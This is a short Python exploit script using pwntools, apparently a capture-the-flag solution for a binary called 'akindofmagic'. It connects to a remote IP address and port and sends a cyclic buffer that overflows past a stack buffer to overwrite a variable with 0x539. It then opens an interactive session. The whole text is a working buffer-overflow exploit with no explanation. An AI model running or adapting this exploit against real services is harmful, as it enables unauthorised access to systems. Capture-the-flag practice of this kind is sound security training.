from pwn import *

# p = process("./akindofmagic")
p = remote("143.198.184.186", 5000)

p.recv()
payload = cyclic(0x40)
payload = payload[:cyclic_find('laaa')] + p64(0x539)
p.sendline(payload)

p.interactive()
